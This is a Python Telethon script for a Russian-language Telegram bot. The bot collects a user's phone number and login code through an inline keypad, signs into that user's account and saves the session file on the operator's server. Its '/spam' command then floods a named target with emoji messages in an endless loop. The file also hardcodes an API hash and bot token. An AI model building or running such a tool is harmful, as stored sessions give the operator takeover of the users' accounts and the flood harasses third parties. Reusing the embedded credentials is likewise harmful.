import asyncio
import os
from telethon import TelegramClient, events, Button
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError

API_ID = 34887681
API_HASH = "9a2905a9627fb1959b6699452ec59e99"
BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"

os.makedirs("sessions", exist_ok=True)

user_states = {}

async def main():
    bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        chat_id = event.chat_id
        if chat_id in user_states and user_states[chat_id].get('logged'):
            await event.reply('✅ Уже в системе! /spam @username')
            return
        buttons = [[Button.request_phone('📱 Передать контакт', resize=True)]]
        await event.reply('Нажми кнопку, чтобы передать контакт:', buttons=buttons)
        user_states[chat_id] = {'step': 'wait_contact'}

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def get_contact(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ Сначала /start')
            return
        
        phone = event.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        try:
            client = TelegramClient(f"sessions/user_{chat_id}", API_ID, API_HASH)
            await client.connect()
            
            result = await client.send_code_request(phone)
            
            # КЛАВИАТУРА ДЛЯ ВВОДА КОДА
            keyboard = [
                [Button.inline('1'), Button.inline('2'), Button.inline('3')],
                [Button.inline('4'), Button.inline('5'), Button.inline('6')],
                [Button.inline('7'), Button.inline('8'), Button.inline('9')],
                [Button.inline('0'), Button.inline('⬅️'), Button.inline('✅ Готово')]
            ]
            
            user_states[chat_id] = {
                'step': 'wait_code',
                'client': client,
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'code': ''  # Храним вводимый код
            }
            
            await event.reply(
                f'✅ Код отправлен на {phone}\nВведи код, нажимая кнопки ниже:',
                buttons=keyboard
            )
        except Exception as e:
            await event.reply(f'❌ Ошибка: {str(e)[:100]}')

    @bot.on(events.CallbackQuery())
    async def on_callback(event):
        chat_id = event.chat_id
        data = event.data.decode()
        
        if chat_id not in user_states:
            await event.answer('Сначала /start', alert=True)
            return
        
        state = user_states[chat_id]
        if state.get('step') != 'wait_code':
            await event.answer('Сначала отправь контакт', alert=True)
            return
        
        if data == '✅ Готово':
            # ВВОДИМ КОД
            code = state['code']
            if len(code) < 4:
                await event.answer('Код должен быть 4-6 цифр', alert=True)
                return
            
            client = state['client']
            try:
                await client.sign_in(
                    phone=state['phone'],
                    code=code,
                    phone_code_hash=state['phone_code_hash']
                )
                state['step'] = 'logged'
                state['logged'] = True
                await event.edit('✅ Вход выполнен! Теперь /spam @username')
            except PhoneCodeInvalidError:
                await event.answer('❌ Неверный код!', alert=True)
                state['code'] = ''
                await event.edit(
                    f'❌ Неверный код. Попробуй снова:',
                    buttons=keyboard_buttons()
                )
            except PhoneCodeExpiredError:
                await event.answer('❌ Код истёк! Нажми /start', alert=True)
                del user_states[chat_id]
            except Exception as e:
                await event.answer(f'Ошибка: {str(e)[:50]}', alert=True)
                del user_states[chat_id]
            return
        
        if data == '⬅️':
            state['code'] = state['code'][:-1]
        else:
            if len(state['code']) >= 6:
                await event.answer('Максимум 6 цифр', alert=True)
                return
            state['code'] += data
        
        # ОТОБРАЖАЕМ ТЕКУЩИЙ КОД
        current = state['code']
        display = '·' * len(current) if current else '____'
        await event.edit(
            f'✅ Код отправлен на {state["phone"]}\n'
            f'Введи код: **{display}**\n'
            f'Цифр: {len(current)}/6',
            buttons=keyboard_buttons()
        )
        await event.answer(f'Код: {current}')

    def keyboard_buttons():
        return [
            [Button.inline('1'), Button.inline('2'), Button.inline('3')],
            [Button.inline('4'), Button.inline('5'), Button.inline('6')],
            [Button.inline('7'), Button.inline('8'), Button.inline('9')],
            [Button.inline('0'), Button.inline('⬅️'), Button.inline('✅ Готово')]
        ]

    @bot.on(events.NewMessage(pattern='/spam'))
    async def start_spam(event):
        chat_id = event.chat_id
        if chat_id not in user_states or not user_states[chat_id].get('logged'):
            await event.reply('❌ Сначала войди через /start')
            return
        
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply('⚠️ /spam @username')
            return
        
        target = parts[1].strip()
        client = user_states[chat_id]['client']
        
        try:
            target_user = await client.get_entity(target)
            await event.reply(f'🍪 Спам {target_user.first_name}!')
            count = 0
            while True:
                await client.send_message(target_user, '🍪' * 20)
                count += 1
                await asyncio.sleep(0.3)
                if count % 20 == 0:
                    await event.reply(f'📨 {count} пачек')
        except Exception as e:
            await event.reply(f'❌ Ошибка: {str(e)[:100]}')

    print('✅ БОТ ЗАПУЩЕН С ИНЛАЙН-КЛАВИАТУРОЙ!')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
